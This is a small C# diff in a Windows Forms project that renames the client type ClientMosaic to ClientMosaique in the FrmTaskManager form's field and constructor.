@@ -6,9 +6,9 @@ namespace Serveur.Views
 {
     public partial class FrmTaskManager : Form
     {
-        private readonly ClientMosaic _client;
+        private readonly ClientMosaique _client;
 
-        public FrmTaskManager(ClientMosaic client)
+        public FrmTaskManager(ClientMosaique client)
         {
             _client = client;
             _client.value.frmTm = this;
